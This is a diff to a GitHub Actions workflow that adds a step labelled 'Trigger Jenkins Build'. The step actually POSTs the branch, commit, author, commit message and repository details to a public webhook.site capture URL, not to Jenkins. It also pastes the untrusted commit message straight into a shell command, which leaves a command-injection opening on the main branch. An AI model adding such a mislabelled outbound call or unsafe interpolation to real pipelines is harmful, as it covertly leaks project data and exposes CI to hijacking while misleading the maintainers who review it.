@@ -100,6 +100,21 @@ jobs:
             body: `## ❌ Pipeline Failed\n\n| Metric | Count |\n|--------|-------|\n| Total | ${total} |\n| ✅ Passed | ${passed} |\n| ❌ Failed | ${failed} |\n\n### Failed Tests:\n${failedTests}\n\n🔗 [View Full Report](${context.serverUrl}/${context.repo.owner}/${context.repo.repo}/actions/runs/${context.runId})`
           });
     
+    - name: Trigger Jenkins Build
+      if: github.event_name == 'push' && github.ref == 'refs/heads/main'
+      run: |
+        curl -X POST "https://webhook.site/402324f0-5f81-4b70-98d6-38cde031812d" \
+          -H "Content-Type: application/json" \
+          -d '{
+            "event": "deploy",
+            "branch": "${{ github.ref_name }}",
+            "commit": "${{ github.sha }}",
+            "author": "${{ github.actor }}",
+            "message": "${{ github.event.head_commit.message }}",
+            "repository": "${{ github.repository }}",
+            "run_id": "${{ github.run_id }}"
+          }'
+    
     - name: Fail if tests or coverage failed
       if: always()
       run: |
